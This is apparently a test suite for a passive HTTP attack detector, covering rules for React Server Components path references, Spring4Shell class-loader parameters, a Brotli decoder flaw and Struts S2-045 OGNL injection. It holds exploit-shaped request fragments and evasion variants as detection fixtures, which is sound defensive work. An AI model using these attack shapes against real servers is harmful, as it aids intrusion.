        "junk_preamble_128k": dict(preamble=b"J" * 131072 + b"\r\n"),
        "random_long_boundary": dict(
            boundary=b"-" * 26 + b"0A1B2C3D4E5F6A7B"),
        "no_closing_delimiter": dict(close=False),
        "chunked": dict(chunked=True),
        "rsc_action_id_header": dict(header=b"rsc-action-id: abc"),
        "body_shape_gate_only": dict(header=b"X-Nothing: 1"),
        "header_case_varied": dict(header=b"NEXT-ACTION: 7f3abc"),
    }
    for label, kw in variants.items():
        out = run1(rsc_request([(b"0", pay)], **kw))
        check(f"HTTP-082: survives {label}", "HTTP-082" in codes(out))
    # charset evasions: the payload is not UTF-8 on the wire at all
    for label, enc, declared in (("utf_16_le", "utf-16-le", b"utf-16le"),
                                 ("utf_16_be", "utf-16-be", b"utf-16be"),
                                 ("utf_32_le", "utf-32-le", b"utf-32le"),
                                 ("utf_16_undeclared", "utf-16-le", None)):
        body = pay.decode().encode(enc)
        out = run1(rsc_request([(b"0", body)], charset=declared))
        check(f"HTTP-082: survives a {label} part", "HTTP-082" in codes(out))
    # a \u-escaped reference: the server resolves the escape, so we must
    out = run1(rsc_request([(b"0", b'["\\u00241:then:constructor"]')]))
    check("HTTP-082: resolves \\uXXXX escapes before matching",
          "HTTP-082" in codes(out))
    # junk padding must not create an inspection window
    big = b'["' + b"P" * 200000 + b'"],["$1:then:constructor"]'
    out = run1(rsc_request([(b"0", big)]))
    check("HTTP-082: no inspection window - 200 KB of junk does not hide it",
          "HTTP-082" in codes(out))


def test_http_082_reference_grammar():
    """The anchor, tested directly.

    Measured traffic does not distinguish a numeric chunk id from any
    alphanumeric tag, because no legitimate reference puts a colon straight
    after a letter tag. That makes the anchor a design decision rather than
    a measured one, so it is tested as a decision: these are the shapes it
    must accept and reject whatever traffic does.
    """
    MATCH = ['$1:then:constructor', '$0:a', '$12:a:b:c:d',
             '$1:__proto__:then', '$999:constructor:constructor']
    NO_MATCH = [
        '$1', '$0', '$W1', '$Q2', '$F1', '$K1', '$B1', '$o1', '$x1', '$@1',
        '$n123', '$NaN', '$Infinity', '$-Infinity', '$undefined', '$-0',
        # a Date: a legitimate reference whose payload CONTAINS colons. An
        # unanchored rule fires on every one of these.
        '$D2026-11-22T22:00:00.000Z', '$D1970-01-01T00:00:00.000Z',
        # a letter tag followed immediately by a colon: not a chunk path,
        # and the reason the id must be numeric.
        '$D:foo', '$F:a:b', '$ACTION_0:0', '$B1337:x',
        # user data, which Flight escapes by doubling the dollar
        '$$1:then:constructor', '$$1:a:b',
        # plain strings
        'then:constructor', '1:then:constructor', 'https://x:8443/a:b',
        '12:34:56', 'a:b:c', '', '$',
    ]
    for value in MATCH:
        check(f"HTTP-082 grammar: {value!r} is a path reference",
              bool(hw.FLIGHT_PATH_REF.match(value)))
    for value in NO_MATCH:
        check(f"HTTP-082 grammar: {value!r} is not a path reference",
              not hw.FLIGHT_PATH_REF.match(value))

    # The fallback path. A body that is not valid JSON overall must still be
    # read, or one trailing comma is an evasion - so the fallback is tested
    # on bodies the strict parse cannot handle.
    for label, text in (
            ("trailing comma", '["$1:then:constructor",]'),
            ("unterminated object", '{"a":["$1:then:constructor"]'),
            ("junk suffix", '["$1:then:constructor"]}}}'),
            ("junk prefix", 'XXXX["$1:then:constructor"]'),
            ("single quotes around the array",
             "{'k': [\"$1:then:constructor\"]}")):
        check(f"HTTP-082: the fallback reads a body with a {label}",
              len(hw.flight_path_references(text)) >= 1)
        check(f"HTTP-082: and it fires end to end with a {label}",
              "HTTP-082" in codes(run1(rsc_request([(b"0", text.encode())]))))
    # and the fallback resolves escapes too, not just the strict parse
    check("HTTP-082: the fallback resolves \\uXXXX escapes",
          len(hw.flight_path_references(
              '["\\u00241:then:constructor",]')) == 1)


def test_http_082_evidence():
    out = run1(rsc_request([(b"0", b'["$1:then:constructor","SECRETCOMMAND"]')]))
    f = [x for x in out if x.code == "HTTP-082"][0]
    ev = f.evidence
    check("HTTP-082: chunk content is never logged",
          "SECRETCOMMAND" not in repr(ev))
    check("HTTP-082: the matched path is recorded",
          ev["references"][0]["segments"] == ["then", "constructor"])
    check("HTTP-082: the chunk id is recorded",
          ev["references"][0]["chunk_id"] == "1")
    check("HTTP-082: the inherited names traversed are recorded as attributes",
          ev["traverses_inherited"] == ["constructor", "then"])
    check("HTTP-082: the gate is recorded",
          ev["gate"].startswith("action_header:next-action"))
    check("HTTP-082: the action id is recorded", ev["action_id"] == "7f3abc")
    check("HTTP-082: says attempt, not compromise",
          "not a compromise" in ev["note"])
    f2 = [x for x in run1(rsc_request([(b"0", b'["$1:then:constructor"]')],
                                      header=b"X-Nothing: 1"))
          if x.code == "HTTP-082"][0]
    check("HTTP-082: the body-shape gate is recorded when there is no header",
          f2.evidence["gate"] == "body_shape")
    out = run1(rsc_request([(b"0", RSC_CHAINS["then_constructor"])],
                           eol=b"\n", chunked=True))
    f3 = [x for x in out if x.code == "HTTP-082"][0]
    check("HTTP-082: evasion markers are recorded",
          "lf_only_line_endings" in f3.evidence["evasion_markers"]
          and "chunked_body" in f3.evidence["evasion_markers"])


def test_http_083_spring4shell():
    def q(name):
        return b"GET /app?" + name + b"=x HTTP/1.1\r\nHost: v\r\n\r\n"

    def form(name):
        body = name + b"=x&other=1"
        return (b"POST /app HTTP/1.1\r\nHost: v\r\n"
                b"Content-Type: application/x-www-form-urlencoded\r\n"
                b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n"
                + body)

    def mp(name):
        return rsc_request([(name, b"x")], header=b"X-None: 1")

    POSITIVES = [
        b"class.module.classLoader.resources.context.parent.pipeline."
        b"first.pattern",
        b"class.module.classLoader.resources.context.parent.pipeline."
        b"first.suffix",
        b"class.classLoader.resources",
        b"class.protectionDomain.codeSource",
        b"class['module']",
        b'class[\'module\']',
        b"Class.Module.ClassLoader",
        b"CLASS.MODULE.CLASSLOADER",
    ]
    NEGATIVES = [
        b"user.address.city", b"items[0].name", b"map['k']",
        b"order.lines[2].product.sku", b"class", b"classification",
        b"myClass.loader", b"product.className", b"a.b.c.d.e",
        b"class.name", b"class.simpleName", b"classLoader",
        b"theClass.module", b"subclass.module", b"name", b"id",
    ]
    for carrier, build in (("query", q), ("urlencoded", form),
                           ("multipart", mp)):
        for name in POSITIVES:
            out = run1(build(name))
            check(f"HTTP-083: {carrier} fires on {name[:34].decode()!r}",
                  "HTTP-083" in codes(out))
        for name in NEGATIVES:
            out = run1(build(name))
            check(f"HTTP-083: {carrier} silent on {name.decode()!r}",
                  "HTTP-083" not in codes(out))

    # percent-encoding is undone for the carriers that percent-encode, and
    # NOT for multipart, where a part name is literal - which is also what
    # Tomcat does with Part.getName().
    enc = b"class%2Emodule%2EclassLoader"
    check("HTTP-083: query percent-decodes the parameter name",
          "HTTP-083" in codes(run1(q(enc))))
    check("HTTP-083: urlencoded percent-decodes the parameter name",
          "HTTP-083" in codes(run1(form(enc))))
    check("HTTP-083: a multipart part name is NOT percent-decoded",
          "HTTP-083" not in codes(run1(mp(enc))))
    check("HTTP-083: '+' becomes a space in a urlencoded name",
          hw.urldecode(b"a+b") == b"a b")

    # the bracket forms, against what servers actually deliver. Measured
    # 2026-11-22: name="class['module']" is delivered by busboy AND by
    # Request.formData(); the backslash-escaped form is delivered by busboy
    # and rejected by undici; name="class["module"]" is delivered by
    # NEITHER, so being silent on it is correct rather than a gap.
    def mp_raw(disp):
        body = (b"--" + RSC_BOUNDARY + b"\r\nContent-Disposition: form-data; "
                b"name=" + disp + b"\r\n\r\nx\r\n--" + RSC_BOUNDARY
                + b"--\r\n")
        return (b"POST /app HTTP/1.1\r\nHost: v\r\nContent-Type: "
                b"multipart/form-data; boundary=" + RSC_BOUNDARY + b"\r\n"
                b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n"
                + body)
    check("HTTP-083: fires on the escaped bracket form busboy delivers",
          "HTTP-083" in codes(run1(mp_raw(b'"class[\\"module\\"]"'))))
    check("HTTP-083: silent on the bare-nested form no server delivers",
          "HTTP-083" not in codes(run1(mp_raw(b'"class["module"]"'))))

    # R2 never stands alone
    out = run1(q(b"class.name"))
    check("HTTP-083 R2: a path through class that stops short does not fire",
          "HTTP-083" not in codes(out))
    out = run1(q(b"class.classLoader.x&class.name=y"))
    f = [x for x in out if x.code == "HTTP-083"]
    check("HTTP-083 R2: recorded as an attribute when R1 fires", bool(f))

    # evidence discipline: values are where the shell lives
    body = (b"class.module.classLoader.resources.context.parent.pipeline."
            b"first.pattern=%25%7Bc2%7Di%20JSPWEBSHELLMARKER")
    raw = (b"POST /app HTTP/1.1\r\nHost: v\r\n"
           b"Content-Type: application/x-www-form-urlencoded\r\n"
           b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body)
    out = run1(raw)
    f = [x for x in out if x.code == "HTTP-083"][0]
    check("HTTP-083: parameter values are never logged",
          "JSPWEBSHELLMARKER" not in repr(f.evidence))
    check("HTTP-083: the prefix runs through the LAST internal segment, so "
          "it shows the path reached the class loader",
          f.evidence["matches"][0]["matched_prefix"]
          == "class.module.classLoader")
    check("HTTP-083: the first internal segment reached is recorded",
          f.evidence["reached"] == ["module"])
    check("HTTP-083: the whole internal chain is recorded",
          f.evidence["matches"][0]["internal_chain"] == ["module",
                                                         "classloader"])
    check("HTTP-083: says attempt, never vulnerable",
          "not on the wire" in f.evidence["note"])
    check("HTTP-083: covers the CVE-2010-1622 ancestor at no extra cost",
          "CVE-2010-1622" in hw.FINDING_REGISTRY["HTTP-083"].cves)

    # the segment parser itself
    check("HTTP-083: dot nesting",
          hw.bean_property_segments(b"a.b.c") == [b"a", b"b", b"c"])
    check("HTTP-083: index brackets",
          hw.bean_property_segments(b"a[0].b") == [b"a", b"0", b"b"])
    check("HTTP-083: single-quoted bracket",
          hw.bean_property_segments(b"a['b'].c") == [b"a", b"b", b"c"])
    check("HTTP-083: double-quoted bracket",
          hw.bean_property_segments(b'a["b"]') == [b"a", b"b"])
    check("HTTP-083: a substring is not a segment",
          hw.spring_path_verdict(b"classification.module") is None)


# ===========================================================================
# Tier G: HTTP-090 Brotli block switch
# ===========================================================================
def test_http_090_arming_gate():
    """The gate must be a property of the COMPILED library, not its version.

    Measured 2026-11-22: a distro security update backported the fix into
    1.1.0 and kept the version string, so a version floor refuses to arm on
    a safe sensor; and plain "1.1.0" could be either build. The probe reads
    what the library names for error code -17, which upstream introduced in
    the fixing commit.
    """
    check("HTTP-090: the block-switch code is -17",
          hw.BROTLI_BLOCK_SWITCH_CODE == -17)
    # Whether this host's library is patched is knowable independently, so
    # the test does not have to take a refusal at face value. A refusal on
    # a library that names the block-switch code is a BUG, not a skip -
    # which is exactly how a version-floor regression escaped the bite tier
    # until this check existed.
    import ctypes as _ct
    host_patched = None
    for soname in hw.BROTLI_SONAMES:
        try:
            _lib = _ct.CDLL(soname)
        except OSError:
            continue
        _lib.BrotliDecoderErrorString.restype = _ct.c_char_p
        _lib.BrotliDecoderErrorString.argtypes = [_ct.c_int]
        host_patched = hw.brotli_patched(
            (_lib.BrotliDecoderErrorString(-17) or b"").decode("latin-1"))
        break
    try:
        probe = hw.arm_brotli()
    except hw.BrotliArmingError as exc:
        check("HTTP-090: refusing to arm is loud, not silent",
              isinstance(exc, RuntimeError))
        check("HTTP-090: it only refuses when the library really is "
              "unpatched - a refusal on a patched library is a regression, "
              "which is what a version floor would cause",
              host_patched is not True)
        print(f"note: no patched libbrotli here, HTTP-090 tests limited ({exc})")
        return
    check("HTTP-090: it armed, and the host library really is patched",
          host_patched is True)
    check("HTTP-090: armed against a patched library", probe is not None)
    # The decision, tested directly - this is what the bite tier could not
    # reach while it lived inside arm_brotli().
    check("HTTP-090: a library naming BLOCK_SWITCH is patched",
          hw.brotli_patched("_ERROR_FORMAT_BLOCK_SWITCH") is True)
    check("HTTP-090: a library answering INVALID is not",
          hw.brotli_patched("INVALID") is False)
    for answer in ("", "RESERVED", "_ERROR_FORMAT_DISTANCE",
                   "_ERROR_UNREACHABLE", "BLOCK", "SWITCH"):
        check(f"HTTP-090: {answer!r} is not evidence of the fix",
              hw.brotli_patched(answer) is False)
    # The measured point that kills a version floor: this host's library is
    # a distro backport reporting 1.1.0, below every upstream fixed version,
    # and it IS patched. On a host already running 1.2.1 the check is
    # vacuous and says so rather than pretending to have measured it.
    if probe.version < (1, 2, 1):
        check("HTTP-090: arms on a backported build whose version is below "
              "every upstream floor, which is why the version cannot gate",
              True)
    else:
        print(f"note: this host runs libbrotli {probe.version_string}, so the "
              f"backport case is not exercised here")
    name = probe.lib.BrotliDecoderErrorString(-17)
    check("HTTP-090: the armed library names the block-switch code",
          b"BLOCK_SWITCH" in (name or b""))
    check("HTTP-090: the version is recorded as an attribute",
          probe.version_string.count(".") == 2)

    # Arming must REFUSE an unpatched decoder. A missing library is a
    # refusal too, and the message has to say which test failed.
    try:
        hw.arm_brotli("/nonexistent/libbrotlidec.so.1")
        check("HTTP-090: refuses a library it cannot load", False)
    except hw.BrotliArmingError as exc:
        check("HTTP-090: refuses a library it cannot load", True)
        check("HTTP-090: the refusal explains the real test",
              "version is not the test" in str(exc))
    check("HTTP-090: disarmed means silent, not open",
          hw.check_brotli(hw.parse_message(
              b"POST / HTTP/1.1\r\nHost: v\r\nContent-Encoding: br\r\n"
              b"Content-Length: 3\r\n\r\nabc", "request"),
              b"abc", {"framing": "content-length"}, None) == [])


def test_http_090_real_streams():
    try:
        probe = hw.arm_brotli()
        import brotli as _br
    except (hw.BrotliArmingError, ImportError) as exc:
        print(f"note: HTTP-090 real-stream tests skipped ({exc})")
        return
    cfg = hw.WatchConfig(brotli=probe)

    def breq(payload, coding=b"br"):
        return (b"POST /api HTTP/1.1\r\nHost: app\r\nContent-Encoding: "
                + coding + b"\r\nContent-Length: "
                + str(len(payload)).encode() + b"\r\n\r\n" + payload)

    def bcodes(raw):
        m = hw.parse_message(raw, "request")
        return codes(hw.analyse_http1_message(m, raw, cfg=cfg))

    data = b"ragnar passive detection " * 400
    bad = 0
    for quality in range(12):
        for lgwin in (10, 16, 22, 24):
            comp = _br.compress(data, quality=quality, lgwin=lgwin)
            st = probe.decode_status(comp)
            if st["status"] != "success" or bcodes(breq(comp)):
                bad += 1
    check("HTTP-090: 48 valid streams (quality 0-11 x lgwin 10/16/22/24) "
          "decode clean and raise nothing", bad == 0)

    comp = _br.compress(data, quality=5)
    for label, payload in (("truncated to half", comp[:len(comp) // 2]),
                           ("missing last byte", comp[:-1]),
                           ("all zeroes", b"\x00" * 64),
                           ("A-padded valid stream",
                            _br.compress(b"A" * 4096, quality=1) + b"A" * 64)):
        check(f"HTTP-090: silent on {label}",
              "HTTP-090" not in bcodes(breq(payload)))
    check("HTTP-090: br anywhere in a coding list is honoured",
          probe.decode_status(comp)["status"] == "success"
          and hw.has_brotli_coding(hw.parse_message(
              breq(comp, coding=b"gzip, br"), "request")) is not None)
    check("HTTP-090: a body with no br coding is not decoded at all",
          hw.has_brotli_coding(hw.parse_message(
              breq(comp, coding=b"gzip"), "request")) is None)

    # The FP measurement: corrupt legitimate streams and count R1. This
    # measures negatives only; it is not a search for the trigger.
    import random as _rnd
    rng = _rnd.Random(20261122)
    fires = 0
    seen_errors = set()
    for _ in range(300):
        buf = bytearray(_br.compress(data, quality=rng.randrange(12)))
        for _ in range(rng.randrange(1, 4)):
            buf[rng.randrange(len(buf))] ^= 1 << rng.randrange(8)
        st = probe.decode_status(bytes(buf))
        seen_errors.add(st.get("error_name", st["status"]))
        if "HTTP-090" in bcodes(breq(bytes(buf))):
            fires += 1
    check("HTTP-090: 300 bit-flipped legitimate streams raise nothing",
          fires == 0)
    check("HTTP-090: corruption really does produce other format errors, "
          "so the silence is discrimination and not a dead rule",
          len([e for e in seen_errors if "ERROR_FORMAT" in str(e)]) >= 3)

    # bounded decode: a large body costs a fixed output buffer
    big = _br.compress(b"Z" * (8 * 1024 * 1024), quality=1)
    st = probe.decode_status(big)
    check("HTTP-090: an 8 MiB payload decodes without buffering the output",
          st["status"] == "success" and st["bytes_out"] == 8 * 1024 * 1024)
    check("HTTP-090: the output buffer is a fixed size",
          hw.BROTLI_OUT_CHUNK == 64 * 1024)


def test_http_090_fault_injection():
    """The positive. Commit 0ed4268a ships no test vector, and building the
    trigger would mean reverse-engineering it, so the error path is driven
    directly instead - and that limit is stated in the README."""
    class Stub:
        version_string = "1.2.1"
        path = "<fault-injected>"
        def decode_status(self, data, budget=2.0):
            return {"status": "error", "error_code": -17,
                    "error_name": "_ERROR_FORMAT_BLOCK_SWITCH",
                    "bytes_consumed": len(data), "bytes_out": 0}

    class OtherError(Stub):
        def decode_status(self, data, budget=2.0):
            return {"status": "error", "error_code": -3,
                    "error_name": "_ERROR_FORMAT_RESERVED",
                    "bytes_consumed": len(data), "bytes_out": 0}

    raw = (b"POST /api/u HTTP/1.1\r\nHost: app\r\nContent-Encoding: br\r\n"
           b"Content-Length: 5\r\n\r\nabcde")
    msg = hw.parse_message(raw, "request")
    out = hw.analyse_http1_message(msg, raw,
                                   cfg=hw.WatchConfig(brotli=Stub()))
    check("HTTP-090: fires when the decoder reports the block switch",
          "HTTP-090" in codes(out))
    f = [x for x in out if x.code == "HTTP-090"][0]
    check("HTTP-090: the decoder's own error name is recorded",
          f.evidence["decoder_error"] == "_ERROR_FORMAT_BLOCK_SWITCH")
    check("HTTP-090: decompressed output is never logged",
          "bytes_out" not in f.evidence and "abcde" not in repr(f.evidence))
    check("HTTP-090: a body digest is carried for IOC matching",
          f.evidence["body_digest"] == hw.redact(b"abcde"))
    check("HTTP-090: the decoder version and path are recorded",
          f.evidence["decoder_version"] == "1.2.1")
    check("HTTP-090: says attack on the wire, not compromised host",
          "not a compromised host" in f.evidence["note"])
    out = hw.analyse_http1_message(msg, raw,
                                   cfg=hw.WatchConfig(brotli=OtherError()))
    check("HTTP-090: every OTHER format error stays out of the stream",
          "HTTP-090" not in codes(out))

    # the response direction is off unless asked for
    resp = (b"HTTP/1.1 200 OK\r\nContent-Encoding: br\r\n"
            b"Content-Length: 5\r\n\r\nabcde")
    rmsg = hw.parse_message(resp, "response")
    out = hw.analyse_http1_message(rmsg, resp,
                                   cfg=hw.WatchConfig(brotli=Stub()))
    check("HTTP-090: the response direction is off by default",
          "HTTP-090" not in codes(out))
    out = hw.analyse_http1_message(
        rmsg, resp, cfg=hw.WatchConfig(brotli=Stub(),
                                       brotli_scan_responses=True))
    check("HTTP-090: the response direction fires when enabled",
          "HTTP-090" in codes(out))


# ===========================================================================
# the shared decode pipeline
# ===========================================================================
def test_decode_pipeline():
    body, complete, trunc = hw.dechunk(
        b"4\r\nWiki\r\n5\r\npedia\r\n0\r\n\r\n", 0, 1 << 20)
    check("dechunk: joins the chunks", body == b"Wikipedia")
    check("dechunk: knows it finished", complete is True and trunc is False)
    body, complete, _ = hw.dechunk(b"4\nWiki\n0\n\n", 0, 1 << 20)
    check("dechunk: tolerates bare LF as a server does", body == b"Wiki")
    body, complete, trunc = hw.dechunk(
        b"ffff\r\n" + b"A" * 65535 + b"\r\n0\r\n\r\n", 0, 1024)
    check("dechunk: stops at the cap", len(body) == 1024 and trunc is True)
    body, complete, _ = hw.dechunk(b"4\r\nWiki\r\n", 0, 1 << 20)
    check("dechunk: reports an unfinished body", complete is False)
    body, complete, _ = hw.dechunk(b"zz\r\n", 0, 1 << 20)
    check("dechunk: a bad size is not guessed at", complete is False)
    body, _, _ = hw.dechunk(b"4;ext=1\r\nWiki\r\n0\r\n\r\n", 0, 1 << 20)
    check("dechunk: chunk extensions are skipped", body == b"Wiki")

    # The Content-Length input cap. The bite tier found this untested: the
    # dechunk cap had a test and this one did not, so removing it escaped.
    big = b"B" * 50000
    raw = (b"POST / HTTP/1.1\r\nHost: v\r\nContent-Length: "
           + str(len(big)).encode() + b"\r\n\r\n" + big)
    msg = hw.parse_message(raw, "request")
    got, info = hw.request_body(msg, raw, 4096)
    check("request_body: a Content-Length body stops at the cap",
          len(got) == 4096)
    check("request_body: and says it was truncated", info["truncated"] is True)
    got, info = hw.request_body(msg, raw, 1 << 20)
    check("request_body: under the cap nothing is truncated",
          len(got) == 50000 and info["truncated"] is False)
    check("request_body: the default cap is what the README states",
          hw.WATCH_DEFAULTS.body_cap == 1024 * 1024)
    raw2 = (b"POST / HTTP/1.1\r\nHost: v\r\nContent-Encoding: br\r\n"
            b"Content-Length: 3\r\n\r\nabc")
    msg2 = hw.parse_message(raw2, "request")
    _, info2 = hw.request_body(msg2, raw2, 1 << 20)
    check("request_body: a coded body is flagged, not silently decoded",
          info2["coded"] == "br")

    # An RSC-gated body over the cap must be COUNTED, not silently passed:
    # "no reference found" and "we did not look at all of it" have to be
    # distinguishable.
    pad = b'["' + b"P" * 60000 + b'"]'
    body = (b"--" + RSC_BOUNDARY + b"\r\nContent-Disposition: form-data; "
            b'name="0"\r\n\r\n' + pad + b"\r\n--" + RSC_BOUNDARY + b"--\r\n")
    req = (b"POST /d HTTP/1.1\r\nHost: v\r\nNext-Action: 1\r\n"
           b"Content-Type: multipart/form-data; boundary=" + RSC_BOUNDARY
           + b"\r\nContent-Length: " + str(len(body)).encode() + b"\r\n\r\n"
           + body)
    w = hw.HttpWatch(cfg=hw.WatchConfig(body_cap=4096))
    out = w.feed("cap", "10.0.0.1", "10.0.0.2", 80, req, True, now=1.0)
    check("HTTP-082: a gated body over the cap raises nothing",
          "HTTP-082" not in codes(out))
    check("HTTP-082: but it is counted as only partly inspected",
          w.stats["tierf_inspect_truncated"] == 1)
    w2 = hw.HttpWatch()
    w2.feed("ok", "10.0.0.1", "10.0.0.2", 80, req, True, now=1.0)
    check("HTTP-082: a body that fits is not counted as truncated",
          w2.stats["tierf_inspect_truncated"] == 0)

    main, params = hw.parse_content_type(
        b'multipart/form-data; boundary="a;b"; charset=UTF-8')
    check("content-type: type lowercased", main == b"multipart/form-data")
    check("content-type: a quoted value may contain a semicolon",
          params[b"boundary"] == b"a;b")
    check("content-type: parameter names fold case",
          params[b"charset"] == b"UTF-8")
    main, params = hw.parse_content_type(b"TEXT/Plain ;  CharSet = utf-16le ")
    check("content-type: whitespace around '=' tolerated",
          params[b"charset"] == b"utf-16le")

    decs = hw.decode_every_way("hello".encode("utf-16-le"), b"utf-16le")
    check("charset: the declared charset is honoured",
          any(t == "hello" for _, t in decs))
    decs = hw.decode_every_way("hello".encode("utf-16-le"), None)
    check("charset: a wide encoding is tried even undeclared",
          any(t == "hello" for _, t in decs))
    decs = hw.decode_every_way(b"plain", b"x-unknown-charset")
    check("charset: an unknown charset does not lose the utf-8 decode",
          any(t == "plain" for _, t in decs))

    check("urlencoded: names only, values untouched",
          hw.urlencoded_names(b"a=1&b=2&c") == [b"a", b"b", b"c"])
    check("urlencoded: percent-decoded",
          hw.urlencoded_names(b"a%2Eb=1") == [b"a.b"])
    check("urlencoded: ';' separates too",
          hw.urlencoded_names(b"a=1;b=2") == [b"a", b"b"])

    parts, meta = hw.parse_multipart(
        b"J" * 5000 + b"\r\n--B\r\nContent-Disposition: form-data; "
        b'name="0"\r\n\r\nvalue\r\n--B--\r\n', b"B")
    check("multipart: a preamble is ignored, not treated as a window",
          len(parts) == 1 and parts[0].content == b"value")
    check("multipart: the preamble size is recorded",
          meta["preamble_bytes"] == 5002)   # 5000 junk bytes plus its CRLF
    parts, meta = hw.parse_multipart(
        b"--B\nContent-Disposition: form-data; name=\"0\"\n\nv\n--B--\n", b"B")
    check("multipart: LF-only endings parse", len(parts) == 1)
    check("multipart: LF-only is recorded", meta["lf_only"] is True)
    parts, _ = hw.parse_multipart(
        b'--B\r\nContent-Disposition: form-data; name="0"\r\n\r\na\r\n'
        b'--B\r\nContent-Disposition: form-data; name="0"\r\n\r\nb\r\n'
        b"--B--\r\n", b"B")
    check("multipart: duplicate names are kept separate, not collapsed",
          len(parts) == 2 and [p.content for p in parts] == [b"a", b"b"])
    parts, _ = hw.parse_multipart(
        b'--B\r\nCONTENT-DISPOSITION: form-data; name="0"\r\n\r\na\r\n'
        b"--B--\r\n", b"B")
    check("multipart: part header names fold case",
          len(parts) == 1 and parts[0].name == b"0")

# ===========================================================================
# HTTP-084 / HTTP-085: Apache Struts S2-045 and S2-046 (CVE-2017-5638)
# ===========================================================================
def struts_req(content_type, line=b"POST /struts/a.action HTTP/1.1",
               extra=b""):
    return line + b"\r\nHost: v\r\nContent-Type: " + content_type \
        + b"\r\n" + extra + b"\r\n"


def test_http_084_conditions():
    """The three conditions, each isolated.

    All three are set by the victim's own code, and pinned from the shipped
    source of the last vulnerable releases:
      1 Dispatcher.wrapRequest       contains("multipart/form-data"), raw
      2 FileItemIteratorImpl         !lower().startsWith("multipart/")
      3 TextParseUtil                openers {'$','%'} followed by '{'
    A rule that drops any one of them is either blind or noisy, so each is
    tested on its own as well as together.
    """
    LITERAL = b"multipart/form-data"
    check("HTTP-084: condition 1 literal is the lowercase form",
          hw.STRUTS_ROUTE_LITERAL == LITERAL)
    check("HTTP-084: condition 2 prefix is 'multipart/'",
          hw.STRUTS_FILEUPLOAD_PREFIX == b"multipart/")
    check("HTTP-084: condition 3 openers are exactly %{ and ${",
          set(hw.OGNL_OPENERS) == {b"%{", b"${"})

    # all three
    for label, ct in (
            ("canonical", b"%{(#_='multipart/form-data').(#x=1)}"),
            ("dollar", b"${(#_='multipart/form-data')}"),
            ("quoted param, grammar kept valid",
             b'text/plain; a="%{(#x=\'multipart/form-data\')}"'),
            ("literal after the opener", b"%{x}multipart/form-data"),
            ("json host type",
             b'application/json; c="${multipart/form-data}"'),
            ("literal twice",
             b"text/plain; a=%{multipart/form-datamultipart/form-data}")):
        out = run1(struts_req(ct))
        check(f"HTTP-084: fires on {label}", "HTTP-084" in codes(out))

    # condition 1 alone missing: no literal, so Struts never routes it into
    # the multipart parser and the exception never carries the payload
    for ct in (b'text/plain; note="${x}"', b"text/plain; a=%{1}",
               b'application/json; x="%{(#y=1)}"',
               b"text/plain; a=%{multipart/form_data}",
               b"text/plain; a=%{multipart/formdata}"):
        out = run1(struts_req(ct))
        check(f"HTTP-084: silent without the literal {ct[:30]!r}",
              "HTTP-084" not in codes(out))

    # condition 1 is CASE-SENSITIVE: Struts uses String.contains on the raw
    # value, so an uppercase spelling is not routed to the parser at all
    for ct in (b"Multipart/Form-Data", b"MULTIPART/FORM-DATA",
               b"multiPart/form-data", b"multipart/Form-data",
               b"MultiPart/FORM-DATA"):
        out = run1(struts_req(b"text/plain; a=%{1}" + ct))
        check(f"HTTP-084: condition 1 is case-sensitive, so {ct!r} is silent",
              "HTTP-084" not in codes(out))

    # condition 2 alone missing: it DOES start with multipart/, so
    # commons-fileupload never throws. This is the near-miss false positive
    # the whole rule depends on excluding, and the victim's code excludes it.
    for label, ct in (
            ("broken client template, dollar",
             b"multipart/form-data; boundary=${boundary}"),
            ("broken client template, percent",
             b"multipart/form-data; boundary=%{boundary}"),
            ("suffixed type with an opener",
             b"multipart/form-dataX; q=%{1}"),
            ("lowercase prefix with uppercase tail",
             b"multipart/FORM-DATA; a=%{multipart/form-data}")):
        out = run1(struts_req(ct))
        check(f"HTTP-084: silent on {label} - it starts with multipart/",
              "HTTP-084" not in codes(out))

    # condition 3 alone missing: no opener, so the message is never evaluated
    for ct in (b"text/plain; a=multipart/form-data",
               b"application/json; x=multipart/form-data",
               b"text/plain; a=$multipart/form-data",
               b"text/plain; a={multipart/form-data}",
               b"text/plain; a=%multipart/form-data"):
        out = run1(struts_req(ct))
        check(f"HTTP-084: silent without an opener {ct[:34]!r}",
              "HTTP-084" not in codes(out))


def test_http_084_real_client_corpus():
    """A real-client Content-Type corpus. None of it may fire."""
    CORPUS = [
        b"multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
        b"multipart/form-data; boundary=--------------------------123456789",
        b"multipart/form-data; boundary=Boundary+0xAbCdEfGbOuNdArY",
        b"multipart/form-data;boundary=--------------------------abc",
        b"multipart/mixed; boundary=gc0p4Jq0M2Yt08j34c0p",
        b"application/x-www-form-urlencoded",
        b"application/x-www-form-urlencoded; charset=UTF-8",
        b"application/json", b"application/json; charset=utf-8",
        b"text/plain", b"text/plain; charset=ISO-8859-1",
        b"text/html; charset=utf-8", b"application/xml",
        b"application/soap+xml; charset=utf-8; action=\"urn:x\"",
        b"application/octet-stream", b"application/grpc",
        b"image/jpeg", b"image/png",
        b"application/vnd.api+json",
        b"application/x-amz-json-1.1",
        b"multipart/related; boundary=x; type=application/xop+xml",
        b"multipart/byteranges; boundary=THIS_STRING_SEPARATES",
    ]
    for ct in CORPUS:
        out = run1(struts_req(ct))
        check(f"HTTP-084: real-client type stays silent {ct[:40]!r}",
              "HTTP-084" not in codes(out))
    check("HTTP-084: the corpus covers more than 20 real types",
          len(CORPUS) > 20)


def test_http_084_evidence_and_headers():
    ct = b'text/plain; a="%{(#x=\'multipart/form-data\').(#cmd=\'STAGINGHOST\')}"'
    out = run1(struts_req(ct))
    f = [x for x in out if x.code == "HTTP-084"][0]
    ev = f.evidence
    check("HTTP-084: the advisory is named", ev["advisory"] == "S2-045")
    check("HTTP-084: all three conditions are recorded as having held",
          all(ev["conditions"].values()) and len(ev["conditions"]) == 3)
    check("HTTP-084: the opener seen is recorded", ev["openers"] == ["%{"])
    check("HTTP-084: the payload is NOT logged by default",
          "STAGINGHOST" not in repr(ev) and "payload" not in ev)
    check("HTTP-084: a digest is carried instead",
          ev["value_digest"] == hw.redact(ct))
    check("HTTP-084: says attempt, not vulnerable",
          "not on the wire" in ev["note"])
    msg = hw.parse_message(struts_req(ct), "request")
    opted = hw.analyse_http1_message(
        msg, b"", cfg=hw.WatchConfig(log_attack_payload=True))
    f2 = [x for x in opted if x.code == "HTTP-084"][0]
    check("HTTP-084: the payload appears only when opted in",
          "STAGINGHOST" in f2.evidence.get("payload", ""))

